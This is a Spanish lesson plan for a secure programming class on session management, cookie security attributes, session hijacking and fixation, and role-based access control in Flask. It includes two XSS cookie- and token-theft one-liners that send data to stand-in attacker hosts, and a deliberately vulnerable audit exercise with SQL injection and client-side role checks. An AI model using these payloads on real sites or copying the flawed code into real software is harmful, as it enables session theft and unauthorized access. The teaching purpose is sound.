# S3 — SESIÓN DE CLASE COMPLETA
## Autenticación, Gestión de Cookies y Niveles de Acceso

| Campo | Detalle |
|---|---|
| **Curso** | Programación Segura (DD281) |
| **Semana** | 3 |
| **Unidad** | 1 — Control de Autenticación, Control de Roles y Privilegios |
| **Ciclo** | VIII — Ingeniería de Sistemas |
| **Semestre** | 2026-1 |
| **Duración** | 3 horas + 20 min receso (200 min total) |
| **Valor** | Excelencia mediante el control estricto de la persistencia de datos |
| **Trabajo colaborativo** | Auditoría de Sesiones y Cookies |

---

## Logro de Aprendizaje

> Al finalizar la sesión, el estudiante **evidencia el modelado del proyecto** aplicando buenas prácticas en la gestión de sesiones y la seguridad basada en roles y privilegios **con excelencia**.

**Indicadores medibles:**
- Identifica niveles de acceso basados en roles y privilegios específicos
- Analiza técnicas para prevenir el secuestro de sesiones mediante cookies
- Modela un sistema de sesiones aplicando correctamente los atributos de seguridad de cookies

---

## Tabla de Contenidos

1. [Cronograma](#cronograma)
2. [INICIO](#inicio) — 20 min
3. [UTILIDAD](#utilidad) — 10 min
4. [TRANSFORMACIÓN](#transformacion) — 70 min
5. [RECESO](#receso) — 20 min
6. [PRÁCTICA](#practica) — 40 min
7. [CIERRE](#cierre) — 10 min
8. [Guion verbal](#guion)
9. [Casos reales](#casos)
10. [Evaluación formativa](#evaluacion)
11. [Referencias APA 7](#referencias)
12. [Recursos y links](#recursos)

---

## Cronograma de la Sesión {#cronograma}

| # | Bloque | Actividad | Min | Responsable |
|:---:|---|---|:---:|---|
| 1 | INICIO | Rompe-hielo: ¿Quién soy para el servidor? | 5 | Docente |
| 2 | INICIO | Presentación del logro de aprendizaje | 3 | Docente |
| 3 | INICIO | Revisión S2: Login seguro y SSL | 7 | Estudiantes |
| 4 | INICIO | Diagnóstico inicial de conocimientos previos | 5 | Estudiantes |
| 5 | UTILIDAD | Por qué importa + estadísticas + pregunta retadora | 10 | Docente |
| 6 | TRANSF. | T1: HTTP sin estado y necesidad de sesiones | 15 | Docente + Est. |
| 7 | TRANSF. | T2: Anatomía y ciclo de vida de una sesión | 10 | Docente + Est. |
| 8 | TRANSF. | T3: Cookies y atributos de seguridad | 20 | Docente + Est. |
| 9 | TRANSF. | T4: Session Hijacking y Session Fixation | 15 | Docente + Est. |
| 10 | TRANSF. | T5: RBAC — Control de acceso basado en roles | 10 | Docente + Est. |
| — | **RECESO** | — | **20** | — |
| 11 | PRÁCTICA | Caso grupal: Auditoría de Sesiones y Cookies | 25 | Estudiantes |
| 12 | PRÁCTICA | Ejercicio individual: Diseño RBAC | 15 | Estudiantes |
| 13 | CIERRE | Síntesis colaborativa | 4 | Est. + Docente |
| 14 | CIERRE | Metacognición | 3 | Estudiantes |
| 15 | CIERRE | Tarea y puente hacia S4 | 3 | Docente |
| | **TOTAL** | | **180** | |

---

## 1. INICIO {#inicio}

### a) ROMPE-HIELO (5 min) — "¿Quién soy yo para el servidor?"

**Instrucción verbal al docente:**

> "Buenos días/tardes. Antes de empezar, necesito que abran su celular o laptop y entren a Instagram, Gmail, o cualquier red social donde tengan cuenta. Ya están dentro, ¿verdad? Ahora cierren la pestaña completamente. Ábrala de nuevo. ¿Siguen dentro? [Pausa — la mayoría dice sí]. Perfecto. Ahora la pregunta del millón: el servidor de Instagram no los conoce. No sabe su cara, no recuerda su contraseña. HTTP es un protocolo que olvida TODO entre petición y petición. ¿Cómo sabe entonces que siguen siendo ustedes?"

**Propósito:** Activar la tensión cognitiva central — HTTP es stateless y las sesiones son el mecanismo que resuelve eso. El estudiante lo experimenta antes de que se lo expliquen.

**Observación:** Si alguien dice "usa cookies" — perfecto, ya saben algo. Si no saben — generamos la pregunta correcta para aprender.

---

### b) LOGRO DE APRENDIZAJE (3 min)

**Guion verbal textual:**

> "Hoy vamos a trabajar con algo que está presente en cada sistema web que hayan tocado: la sesión. La semana pasada vimos cómo hacer un login seguro con hash y SSL. Excelente. Pero el login dura medio segundo. La sesión dura horas. Si esa sesión no está bien configurada, todo el login seguro que construimos la semana pasada puede ser inútil en 30 segundos con una herramienta gratuita que cualquiera puede descargar.
>
> Al finalizar esta sesión, cada uno va a poder hacer tres cosas concretas: **uno**, identificar roles y niveles de acceso en un sistema. **Dos**, analizar y prevenir el secuestro de sesiones mediante cookies. **Tres**, modelar un sistema con buenas prácticas de gestión de sesiones. Y esto conecta directo con la Evaluación Parcial de la semana que viene."

---

### c) REVISIÓN SESIÓN ANTERIOR — S2 (7 min)

*Seleccionar estudiantes al azar de la lista — no pedir voluntarios.*

---

**PREGUNTA R1 al estudiante:**
> "¿Por qué no es suficiente usar cifrado para proteger contraseñas en la base de datos? ¿Qué técnica usamos en S2 y cuál es la diferencia?"

**→ RESPUESTA ESPERADA DETALLADA:**
Usamos **hashing con bcrypt**. La diferencia fundamental: el cifrado es **reversible** — si alguien obtiene la clave de cifrado, descifra todas las contraseñas. El hash es una función de **una sola vía** — no existe forma matemática de revertirlo para obtener la contraseña original. bcrypt además agrega un **salt** aleatorio por contraseña, lo que hace que dos contraseñas idénticas produzcan hashes distintos, previniendo ataques de rainbow table. Si roban la base de datos, obtienen hashes inútiles.

**Si responde mal:** "Recuerden que cifrar es como meter algo en una caja con llave — si alguien tiene la llave, lo abre. Hashear es como pasar la contraseña por una picadora — no hay vuelta atrás. ¿Quién puede completar esa idea?"

---

**PREGUNTA R2 al estudiante:**
> "¿Qué protege específicamente SSL/TLS en el proceso de login, y qué pasa si el login funciona sobre HTTP sin cifrar?"

**→ RESPUESTA ESPERADA DETALLADA:**
SSL/TLS crea un **canal cifrado entre el navegador y el servidor**. Protege específicamente la **transmisión de las credenciales** — usuario y contraseña. Sin HTTPS, esas credenciales viajan en texto plano. Cualquier persona en la misma red WiFi puede capturarlas con Wireshark o herramientas similares en segundos. HTTPS = HTTP + TLS. Sin él, el login más sofisticado es irrelevante porque las credenciales se ven antes de llegar al servidor.

---

**PREGUNTA R3 al estudiante:**
> "¿Qué es una especificación formal de seguridad y por qué debe existir antes de escribir código?"

**→ RESPUESTA ESPERADA DETALLADA:**
Es un documento que define con precisión qué acciones están **permitidas o prohibidas**, quién puede ejecutarlas y bajo qué condiciones verificables. Debe existir antes del código porque la seguridad improvisada genera parches sobre parches. Un error de diseño de seguridad cuesta 100x más corregirlo después del despliegue que antes de programar. Es el equivalente a un contrato de seguridad del sistema.

---

### d) DIAGNÓSTICO INICIAL (5 min)

*Mostrar en pantalla. Levantar mano o responder en voz alta.*

---

**PREGUNTA D1:**
> "¿Alguien puede explicar con sus propias palabras qué significa que HTTP sea 'sin estado'?"

**→ RESPUESTA ESPERADA:**
Que **cada petición HTTP es independiente** — el servidor no recuerda peticiones anteriores. Si el usuario se autentica en la petición 1, en la petición 2 el servidor lo trata como un desconocido. No tiene memoria entre peticiones. Por eso existen las sesiones — para darle al servidor esa "memoria".

---

**PREGUNTA D2:**
> "¿Qué es una cookie, técnicamente?"

**→ RESPUESTA ESPERADA:**
Un **pequeño fragmento de texto** que el servidor envía al navegador del cliente. El navegador lo almacena y lo reenvía automáticamente en cada petición al mismo servidor. Es el mecanismo principal para que el servidor "recuerde" al usuario entre peticiones (sesiones, preferencias, estado de autenticación).

---

**PREGUNTA D3:**
> "Si un sistema tiene tres tipos de usuarios — compradores, vendedores y administradores — ¿cómo sabe el sistema qué puede hacer cada uno?"

**→ RESPUESTA ESPERADA:**
A través de **roles y permisos** (RBAC). Cada usuario tiene un rol asignado con permisos específicos. Al intentar una acción, el sistema verifica el rol del usuario y determina si tiene permiso. Más manejable que asignar permisos individualmente a cada persona.

---

## 2. UTILIDAD {#utilidad}

### ¿Por qué este tema importa? (10 min)

**Dato con impacto — leer con pausa:**
> "Según el Verizon DBIR 2023, el **62% de las brechas en aplicaciones web** involucra sesiones comprometidas o credenciales robadas *post*-autenticación. No durante el login — **después**. Un login perfecto con sesión descuidada es como poner una cerradura de alta seguridad en la puerta principal y dejar la ventana abierta."

**Caso real para abrir con fuerza:**
> "En 2010, un desarrollador publicó una extensión para Firefox llamada **Firesheep**. En 30 segundos, cualquier persona en una WiFi pública podía robar la sesión de Facebook, Twitter o Amazon de cualquier usuario en la misma red. Sin conocer la contraseña. Sin hackear el servidor. Solo capturando la cookie de sesión que viajaba sin cifrar. En 24 horas se descargó más de 100,000 veces. El resultado: forzó a Facebook, Twitter y Amazon a implementar HTTPS en toda su plataforma."

**Conexión profesional:**
> "En cualquier sistema que construyan — proyecto del curso, emprendimiento, empresa — van a implementar sesiones. Si esas sesiones no tienen los atributos correctos, cualquier atacante en la misma red puede suplantar a sus usuarios sin conocer ni la contraseña. Hoy aprenden a cerrar esa ventana."

---

**PREGUNTA RETADORA:**
> "Imaginen que trabajan en el equipo de seguridad de Interbank. El CTO les pregunta: '¿Por qué nuestros clientes deberían confiar en que sus sesiones bancarias son seguras?' ¿Qué verificarían primero y qué le responderían?"

**→ RESPUESTA ESPERADA DETALLADA:**
Un profesional respondería cuatro pilares: **(1) Generación segura del Session ID** — criptográficamente aleatorio, 256 bits de entropía, imposible de predecir. **(2) Transmisión cifrada** — cookie con atributo `Secure`, solo viaja sobre HTTPS. **(3) Protección en el cliente** — `HttpOnly` para que JavaScript no la lea, `SameSite=Lax` para proteger contra CSRF. **(4) Ciclo de vida controlado** — expira por inactividad (timeout), se invalida completamente en el servidor al hacer logout.

Para verificarlo: revisaríamos las cabeceras HTTP de respuesta con DevTools, comprobaríamos los atributos de cookies, y realizaríamos pruebas con OWASP ZAP.

---

## 3. TRANSFORMACIÓN {#transformacion}

### T1. HTTP sin Estado y la Necesidad de Sesiones (15 min)

#### Explicación Conceptual

HTTP es **stateless**: cada petición es independiente. El servidor no guarda memoria de quién hizo qué antes. Esto tiene una implicación crítica para la seguridad: si el usuario se autentica en la petición #1, en la petición #2 el servidor no sabe quién es.

```
SIN SESIÓN:
Petición 1  → Usuario: "Hola, soy Juan, contraseña: ••••"
             ← Servidor: "OK, acceso concedido"
Petición 2  → Usuario: "Quiero ver /mi-cuenta"
             ← Servidor: "¿Quién eres? No te conozco."

CON SESIÓN:
Petición 1  → Usuario: "Hola, soy Juan, contraseña: ••••"
             ← Servidor: "OK. Tu session_id = xK9mP3q... [guarda en su memoria]"
Petición 2  → Usuario: "Quiero ver /mi-cuenta [cookie: session_id=xK9mP3q...]"
             ← Servidor: "xK9mP3q = Juan. Aquí está tu cuenta."
```

**Mecanismos de persistencia — Comparativa de seguridad:**

| Mecanismo | Accesible por JS | Protegible con HttpOnly | Riesgo principal |
|---|:---:|:---:|---|
| `localStorage` | ✅ Sí | ❌ No | XSS roba el token fácilmente |
| `sessionStorage` | ✅ Sí | ❌ No | XSS roba el token fácilmente |
| Cookie sin flags | ✅ Sí | ❌ (no configurada) | XSS + sniffing |
| **Cookie + HttpOnly + Secure** | ❌ No | ✅ Sí | **Opción más segura** |

---

**PREGUNTA T1 al grupo:**
> "¿Por qué guardar el session_id en localStorage es inseguro, aunque sea más fácil de implementar?"

**→ RESPUESTA ESPERADA DETALLADA:**
`localStorage` es accesible por cualquier JavaScript que se ejecute en la página. Si el sitio tiene una vulnerabilidad XSS, un atacante inyecta código como `fetch('https://atacante.com?token='+localStorage.getItem('session'))` y roba el token en milisegundos. Las cookies con **`HttpOnly`** resuelven esto: el navegador las envía automáticamente al servidor, pero ningún JavaScript puede leerlas — ni el del atacante. El XSS puede ejecutar código, pero no puede extraer la cookie de sesión.

**Si responde solo "es menos seguro":** "¿Menos seguro por qué específicamente? La respuesta técnica tiene tres letras: X-S-S. ¿Alguien puede conectar XSS con localStorage?"

---

**Mini actividad T1 (3 min):**
> "Abran DevTools (F12) → Application → Storage. Vean qué hay en Local Storage y en Cookies para el sitio donde están. ¿Pueden identificar algún valor que parezca un session ID? ¿Qué diferencias observan entre ambos mecanismos?"

---

### T2. Anatomía y Ciclo de Vida de una Sesión Web (10 min)

#### Explicación Conceptual

```
┌──────────────────────────────────────────────────────────────┐
│              CICLO DE VIDA DE UNA SESIÓN SEGURA              │
├──────────┬───────────────────────────────────────────────────┤
│ FASE 1   │ CREACIÓN: Usuario se autentica.                   │
│ INICIO   │ Servidor genera Session ID aleatorio (256 bits).  │
│          │ Almacena datos de sesión en su lado.              │
│          │ Envía SOLO el Session ID al cliente (cookie).     │
├──────────┼───────────────────────────────────────────────────┤
│ FASE 2   │ MANTENIMIENTO: El Session ID viaja como cookie    │
│ USO      │ en cada petición. Servidor valida contra su       │
│          │ almacén. Timeout se renueva en cada petición.     │
├──────────┼───────────────────────────────────────────────────┤
│ FASE 3   │ EXPIRACIÓN: Timeout de inactividad (ej. 30 min)  │
│ TIMEOUT  │ o tiempo absoluto. Servidor invalida el ID.       │
│          │ La cookie expira en la siguiente respuesta.       │
├──────────┼───────────────────────────────────────────────────┤
│ FASE 4   │ DESTRUCCIÓN: Logout activo del usuario.           │
│ LOGOUT   │ Servidor ELIMINA el ID de su almacén.             │
│          │ Cliente elimina la cookie. AMBOS lados sinc.      │
└──────────┴───────────────────────────────────────────────────┘
```

---

**PREGUNTA T2 al grupo:**
> "Si al hacer logout el servidor solo ordena al navegador borrar la cookie, pero NO invalida el session ID en el servidor, ¿qué puede hacer un atacante que robó esa cookie previamente?"

**→ RESPUESTA ESPERADA DETALLADA:**
Puede **seguir usando el session ID indefinidamente** hasta que expire por timeout. El servidor recibe peticiones con ese ID y las acepta como válidas — no sabe que el usuario hizo logout porque el ID sigue en su almacén. Un logout correcto tiene dos acciones simultáneas: **(1) el servidor elimina el session ID de su almacén** (ya no es válido para nadie, ni para el atacante), Y **(2) el servidor instruye al cliente a eliminar la cookie**. Si falta el paso 1, el "logout" no protege al usuario de un atacante que tiene la cookie. Un logout incompleto es uno de los errores más comunes en aplicaciones reales.

---

### T3. Cookies: Atributos de Seguridad (20 min)

#### Explicación Conceptual

La seguridad de una cookie depende completamente de sus atributos. Una cookie mal configurada es peor que no tener sesión — da una falsa sensación de seguridad.

**Anatomía de una cookie HTTP segura:**
```http
Set-Cookie: session_id=xK9mP3q7rZ2v...;
            Secure;
            HttpOnly;
            SameSite=Lax;
            Path=/;
            Domain=miapp.com;
            Max-Age=1800
```

---

**Atributo 1: HttpOnly**

Impide que JavaScript acceda a la cookie con `document.cookie`. Protege contra XSS.

```python
# Flask — SIN HttpOnly (vulnerable a XSS)
response.set_cookie('session_id', session_id)

# Flask — CON HttpOnly (correcto)
response.set_cookie('session_id', session_id, httponly=True)
```

```java
// Java Servlet — CON HttpOnly
Cookie c = new Cookie("session_id", sessionId);
c.setHttpOnly(true);
response.addCookie(c);
```

---

**Atributo 2: Secure**

La cookie SOLO se envía sobre HTTPS, nunca sobre HTTP. Protege contra sniffing de red.

```python
# Flask — CON Secure (cookie solo viaja cifrada)
response.set_cookie('session_id', session_id, httponly=True, secure=True)
```

---

**Atributo 3: SameSite**

Controla si la cookie se envía en peticiones que originan desde otro dominio.
- `Strict` → Solo mismo dominio. Máxima protección CSRF. Puede romper algunos flujos de navegación.
- `Lax` → Navegación normal permitida, peticiones POST cross-site bloqueadas. **Balance recomendado.**
- `None` → Siempre (requiere Secure). Para iframes/widgets de terceros.

---

**Tabla completa de atributos:**

| Atributo | Protege contra | Valor recomendado | Sin él... |
|---|---|---|---|
| `HttpOnly` | XSS | `True` | JavaScript roba la cookie |
| `Secure` | Sniffing / MITM | `True` | Cookie viaja en texto plano |
| `SameSite` | CSRF | `Lax` | Otro sitio usa la cookie del usuario |
| `Max-Age` | Sesión infinita | 1800 (30 min) | La sesión nunca expira |
| `Path` | Acceso excesivo | `/` o ruta específica | Cookie va a endpoints que no la necesitan |
| `Domain` | Subdominios no deseados | Dominio exacto | Cookie accesible en subdominios |

---

**Código completo Flask — Configuración de sesiones seguras:**

```python
from flask import Flask, session, redirect, make_response
import os, secrets
from datetime import timedelta

app = Flask(__name__)

# ─── CONFIGURACIÓN GLOBAL DE SESIONES ──────────────────────────────────────
# SECRET_KEY: debe ser aleatoria, larga, guardada en variable de entorno
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))

app.config.update(
    SESSION_COOKIE_HTTPONLY  = True,      # JS no puede leer la cookie
    SESSION_COOKIE_SECURE    = True,      # Solo HTTPS (False solo en desarrollo)
    SESSION_COOKIE_SAMESITE  = 'Lax',    # Protección CSRF moderada
    PERMANENT_SESSION_LIFETIME = timedelta(minutes=30),  # Timeout inactividad
)

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # ✅ CRÍTICO: limpiar sesión previa antes de crear nueva (Session Fixation)
        session.clear()
        session['user_id']   = user.id
        session['user_role'] = user.role
        session.permanent    = True   # Aplica PERMANENT_SESSION_LIFETIME
        return redirect('/dashboard')
    return "Credenciales inválidas", 401

@app.route('/logout')
def logout():
    # ✅ LOGOUT CORRECTO: invalidar en servidor Y eliminar del cliente
    session.clear()                       # Invalida en el servidor
    resp = make_response(redirect('/login'))
    resp.delete_cookie('session')         # Elimina del navegador
    return resp
```

---

**ERROR CRÍTICO más común — MOSTRARLO EN PANTALLA:**

```python
# ❌ NUNCA: Guardar datos de autorización en cookie del cliente
response.set_cookie('user_role', 'admin')   # ← El usuario puede EDITAR esto con DevTools!
response.set_cookie('user_id',   '42')      # ← El usuario puede cambiar a '1' (admin)

# ✅ SIEMPRE: Los datos de autorización van en el SERVIDOR
session['user_role'] = 'admin'              # Guardado en servidor, inaccesible al cliente
session['user_id']   = user.id             # Solo el session_id va en la cookie
```

---

**PREGUNTA T3 al grupo:**
> "¿Cuál es la diferencia entre `HttpOnly` y `Secure`? ¿Son redundantes o complementarios?"

**→ RESPUESTA ESPERADA DETALLADA:**
Son **complementarios, no redundantes** — protegen contra vectores de ataque completamente diferentes. `HttpOnly` protege el **valor de la cookie del acceso por JavaScript dentro del navegador** — previene que XSS la robe. `Secure` protege la **cookie en el tránsito de red** — garantiza que solo viaje cifrada por HTTPS. Se necesitan ambos porque los ataques vienen de dos frentes: código malicioso en el navegador (XSS → HttpOnly) e intercepción de tráfico de red (MITM → Secure). Con solo uno de los dos, el otro vector sigue abierto.

---

**PREGUNTA T4 al grupo:**
> "¿Por qué SameSite=None requiere obligatoriamente Secure=True? ¿Qué pasaría si no?"

**→ RESPUESTA ESPERADA DETALLADA:**
`SameSite=None` permite que la cookie se envíe desde cualquier origen cross-site. Como esa cookie ya puede viajar a más contextos, es especialmente crítico que al menos lo haga cifrada. Sin `Secure`, la cookie cruzaría dominios **y además viajaría en texto plano** — doble exposición. Los navegadores modernos (Chrome desde 2020, Firefox, Safari) **rechazan automáticamente** cookies con `SameSite=None` sin `Secure=True` — las descartan silenciosamente. Es una decisión del W3C y los fabricantes de navegadores para forzar buenas prácticas por defecto.

---

### T4. Ataques a Sesiones: Session Hijacking y Session Fixation (15 min)

#### Ataque 1: Session Hijacking (Secuestro de Sesión)

El atacante obtiene un session ID válido de un usuario legítimo y lo usa para suplantar su identidad.

```
VECTOR 1 — Network Sniffing (Red sin cifrar):
Navegador ─── [HTTP texto plano] ──→ Servidor
                    ↑
              Atacante captura
              "Cookie: session_id=abc123"
              → Usa ese ID para hacer peticiones

VECTOR 2 — XSS (si HttpOnly NO está activado):
Atacante inyecta en la página:
<script>
  document.location='https://evil.com/steal?c='+document.cookie
</script>
→ Roba el session_id del usuario

VECTOR 3 — MITM (sin HSTS):
Atacante degrada HTTPS → HTTP
→ Captura cookie de sesión en texto plano
```

**Caso real — Firesheep (2010):** Extensión Firefox que en 30 segundos robaba sesiones de Facebook, Twitter, Amazon en WiFi pública. Solo capturaba cookies sin cifrar. 100,000+ descargas en 24 horas. Forzó a implementar HTTPS completo.

**Prevención:**
1. HTTPS en toda la app (no solo en login)
2. Cookie `Secure=True`
3. Cookie `HttpOnly=True`
4. Header `Strict-Transport-Security: max-age=31536000; includeSubDomains`

---

**PREGUNTA T5 al grupo:**
> "Si un banco guarda la IP del usuario en la sesión y la verifica en cada petición, ¿qué problema real genera esto para los usuarios móviles?"

**→ RESPUESTA ESPERADA DETALLADA:**
Genera **falsos positivos** que cierran sesiones legítimas. Un usuario con celular puede cambiar de IP constantemente: de WiFi a 4G, de red corporativa a datos móviles, a través de proxies. Si la IP cambia y el sistema invalida la sesión, el usuario experimenta cierres inesperados — pésima UX. El trade-off seguridad/usabilidad se resuelve con enfoques más inteligentes: verificar **prefijo de red** (no IP exacta), o usar User-Agent como señal adicional de anomalía, o detectar cambios geográficos imposibles (ej: login en Lima y 5 minutos después en Moscú). Para operaciones críticas (transferencias bancarias), requerir re-autenticación puntual es mejor que bloquear sesiones por cambio de IP.

---

#### Ataque 2: Session Fixation (Fijación de Sesión)

```
ATAQUE SESSION FIXATION:

1. Atacante visita la app → servidor le da session_id = "FIXED_XYZ"
   (asignado ANTES de la autenticación)

2. Atacante envía al usuario víctima:
   https://banco.pe/login?sid=FIXED_XYZ
   (si el sistema acepta session_id por URL — falla de diseño)

3. Usuario hace login con ese SID ya conocido por el atacante

4. Si el servidor NO regenera el SID después del login:
   → Usuario autenticado tiene session_id = "FIXED_XYZ"
   → Atacante ya tiene "FIXED_XYZ" → acceso total a la sesión

PREVENCIÓN — REGLA DE ORO:
SIEMPRE regenerar el Session ID DESPUÉS de la autenticación exitosa
```

**Caso real — GitHub (2012):** Vulnerabilidad que permitía a atacante fijar un session_id antes del login. Si el usuario se autenticaba sin regeneración del ID, el atacante tenía acceso a la cuenta.

```python
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # ✅ LA LÍNEA MÁS IMPORTANTE: limpiar sesión previa
        # Invalida cualquier session_id pre-existente (incluso uno fijado por atacante)
        session.clear()        # ← Esta línea previene Session Fixation
        session['user_id']   = user.id
        session['user_role'] = user.role
        return redirect('/dashboard')
```

---

**PREGUNTA T6 al grupo:**
> "¿Cómo usaría un atacante Session Fixation en un sistema bancario, y cuál es el ÚNICO paso de código que lo previene completamente?"

**→ RESPUESTA ESPERADA DETALLADA:**
**El ataque:** El atacante va al banco online, inicia el proceso (sin autenticarse) → servidor le da `sid=XYZ`. Envía al usuario víctima el link: `banco.pe/login?sid=XYZ`. Si el banco acepta ese SID de la URL y no lo regenera después del login, la víctima se autentica con un SID conocido por el atacante. El atacante usa `sid=XYZ` para acceder como si fuera la víctima.

**La prevención (una línea):** Después del login exitoso, ejecutar `session.clear()` (Flask) o `request.getSession(false).invalidate()` (Java) y crear una sesión completamente nueva. No importa el SID que traía el usuario — después del login, recibe uno nuevo, desconocido para cualquier atacante. Es una de las pocas vulnerabilidades críticas que se cierra con exactamente **una línea de código**.

---

### T5. RBAC — Control de Acceso Basado en Roles (10 min)

#### Explicación Conceptual

**RBAC (Role-Based Access Control):** En lugar de asignar permisos individualmente a cada usuario, se definen **roles** con conjuntos de permisos. Los usuarios reciben roles.

```
USUARIO          ROL              PERMISOS
────────        ──────           ──────────
Juan    ──────► ADMIN    ──────► crear, leer, editar, eliminar, gestionar_usuarios
Pedro   ──────► SUPERVISOR ────► crear, leer, editar, ver_reportes
María   ──────► USUARIO ───────► leer, editar_propio_perfil
```

**Principio de Mínimo Privilegio:** Cada usuario tiene *solo* los permisos estrictamente necesarios. Un estudiante que solo lee notas no necesita eliminar registros.

---

**Implementación RBAC con decoradores Python/Flask:**

```python
from functools import wraps
from flask import session, abort

def require_role(*roles):
    """
    Decorador de verificación de rol. Uso:
    @require_role('admin')
    @require_role('admin', 'supervisor')
    """
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            # ✅ Paso 1: verificar autenticación
            if 'user_id' not in session:
                abort(401)   # No autenticado
            # ✅ Paso 2: verificar rol desde el SERVIDOR (nunca del cliente)
            if session.get('user_role') not in roles:
                abort(403)   # Autenticado pero sin permiso suficiente
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# ─── USO ─────────────────────────────────────────────────────────────────────
@app.route('/admin/usuarios')
@require_role('admin')                    # Solo admin
def gestionar_usuarios():
    return render_template('admin/usuarios.html')

@app.route('/reportes')
@require_role('admin', 'supervisor')     # Admin o supervisor
def ver_reportes():
    return render_template('reportes.html')

@app.route('/mi-perfil')
@require_role('admin', 'supervisor', 'usuario')  # Cualquier usuario autenticado
def mi_perfil():
    return render_template('perfil.html')
```

---

**PREGUNTA T7 al grupo:**
> "¿Qué vulnerabilidad crítica existe si el sistema lee el rol del usuario desde el formulario HTML (`request.form['role']`) en lugar de desde la sesión del servidor?"

**→ RESPUESTA ESPERADA DETALLADA:**
**Parameter tampering** (manipulación de parámetros) — una de las vulnerabilidades más explotadas. Los campos HTML (incluyendo `<input type="hidden">`) son completamente editables con DevTools o interceptando la petición con Burp Suite. Si el código hace `role = request.form.get('role')` y el usuario cambia ese valor de "usuario" a "admin", el servidor lo acepta como administrador sin ninguna autenticación adicional. La regla fundamental: **los datos que controlan la autorización NUNCA vienen del cliente**. El cliente envía solo el session_id (en la cookie). El servidor busca el rol asociado a ese session_id en su propio almacén — datos que el cliente no puede modificar.

---

**PREGUNTA T8 al grupo:**
> "Un desarrollador agrega una columna `es_admin BOOLEAN` a la tabla de usuarios en lugar de implementar RBAC. ¿Qué problemas genera esto cuando el sistema crece a 5 roles diferentes?"

**→ RESPUESTA ESPERADA DETALLADA:**
Es un **anti-patrón** que no escala: **(1) Proliferación de columnas:** Con 5 roles se necesitan 5 columnas booleanas — `es_admin`, `es_supervisor`, `es_auditor`, etc. El esquema crece ad infinitum. **(2) Estados incoherentes:** `es_usuario=True` Y `es_admin=True` simultáneamente — ¿qué rol tiene? **(3) Difícil de auditar:** "¿Quién tiene acceso a qué?" requiere combinar múltiples columnas booleanas en queries complejas. **(4) Mantenimiento costoso:** Agregar un nuevo rol requiere `ALTER TABLE` + migración de datos + actualizar código en múltiples lugares. RBAC resuelve todo con tres tablas normalizadas: `roles`, `permisos`, `rol_permiso` + relación `usuario_rol`. Agregar un rol = insertar un registro.

---

## RECESO {#receso}

**20 minutos.**

*El docente circula, verifica el avance de la mini actividad de DevTools e identifica quiénes necesitan apoyo para el caso práctico.*

---

## 4. PRÁCTICA {#practica}

### a) Caso Práctico Grupal — Auditoría de Sesiones y Cookies (25 min)

**Formación:** Grupos de 4-5 estudiantes. Asignación aleatoria.

---

**ESCENARIO: Sistema Académico "UniSegura"**

El equipo de TI de la Universidad del Pacífico lanzó un nuevo sistema web académico. Hay reportes de que estudiantes pueden ver notas de otros simplemente cambiando el número en la URL: `sistema.upac.pe/notas?alumno_id=1058` → cambian a `alumno_id=1059` y ven notas ajenas.

Al inspeccionar las cookies con DevTools, el auditor encontró:

```http
Set-Cookie: user_session=5f2a9c; Path=/; Domain=upac.pe
Set-Cookie: user_role=estudiante; Path=/; Domain=upac.pe
Set-Cookie: alumno_id=1058; Path=/; Domain=upac.pe
```

En el código publicado accidentalmente en GitHub público:

```python
@app.route('/notas')
def ver_notas():
    alumno_id = request.args.get('alumno_id')         # Lee de la URL
    role      = request.cookies.get('user_role')      # Lee del cliente
    
    if role == 'admin':                                # Verificación desde cookie
        notas = db.execute(
            f"SELECT * FROM notas WHERE alumno_id = {alumno_id}"  # Concatenación directa
        ).fetchall()
        return render_template('notas.html', notas=notas)
    return "Sin acceso", 403
```

---

**PREGUNTAS DEL CASO:**

**1.** Enumeren **todos los problemas de seguridad** con nombre técnico correcto. (Mínimo 7)

**2.** ¿Qué categorías del **OWASP Top 10** están presentes? Cítenlas con su código.

**3.** Reescriban las **cookies** con todos los atributos de seguridad correctos.

**4.** Reescriban la **función `ver_notas()`** de forma segura.

**5.** Diseñen el **esquema RBAC** para este sistema: roles `Estudiante`, `Docente`, `Decano`, `Admin` con sus permisos específicos.

**Producto del grupo:** Una hoja o pantalla con respuestas numeradas. Un portavoz presenta en 3 minutos.

---

**Preguntas de andamiaje del docente mientras circula:**
- "¿Qué pasa si alguien en la WiFi de la universidad captura esas cookies? ¿Por qué puede hacerlo?"
- "El rol del usuario está en una cookie que yo puedo editar con DevTools. ¿Qué hago?"
- "La consulta SQL tiene `{alumno_id}` concatenado. ¿Qué ataque les recuerda eso?"
- "Como estudiante, ¿puedo cambiar `user_role=estudiante` a `user_role=admin` en la cookie?"

---

**RESPUESTA MODELO — PUESTA EN COMÚN (5 min):**

**Problemas encontrados (8 total):**
1. `user_session` sin `HttpOnly` → JavaScript puede robar la sesión (XSS)
2. `user_session` sin `Secure` → viaja en texto plano por HTTP
3. `user_session` sin `SameSite` → vulnerable a CSRF
4. `user_session` sin `Max-Age` → sesión sin expiración
5. `user_role` en cookie del cliente → el usuario puede cambiar su rol (parameter tampering)
6. `alumno_id` en cookie del cliente → manipulable
7. SQL Injection — concatenación directa en la query (OWASP A03)
8. IDOR — `alumno_id` leído de la URL sin verificar propiedad (OWASP A01)

**OWASP:** A01 (Broken Access Control), A03 (Injection), A05 (Security Misconfiguration), A07 (Auth Failures)

**Cookies corregidas:**
```http
Set-Cookie: session_id=<256bits_aleatorio>;
            Secure; HttpOnly; SameSite=Lax;
            Path=/; Domain=sistema.upac.pe;
            Max-Age=1800
```
*(user_role y alumno_id se eliminan de las cookies — van en la sesión del servidor)*

**Código corregido:**
```python
@app.route('/notas')
@require_role('estudiante', 'docente', 'decano', 'admin')
def ver_notas():
    current_user_id = session['user_id']    # Del SERVIDOR
    current_role    = session['user_role']  # Del SERVIDOR

    # Autorización basada en rol
    if current_role == 'estudiante':
        alumno_id = current_user_id          # Solo sus propias notas
    elif current_role in ['docente', 'decano', 'admin']:
        alumno_id = request.args.get('alumno_id', current_user_id)
    
    # Query parametrizada — previene SQL Injection
    notas = db.execute(
        "SELECT * FROM notas WHERE alumno_id = ?",
        (alumno_id,)
    ).fetchall()
    return render_template('notas.html', notas=notas)
```

---

### b) Ejercicio Individual (15 min)

**Instrucción:** Individual, sin consultar al compañero.

---

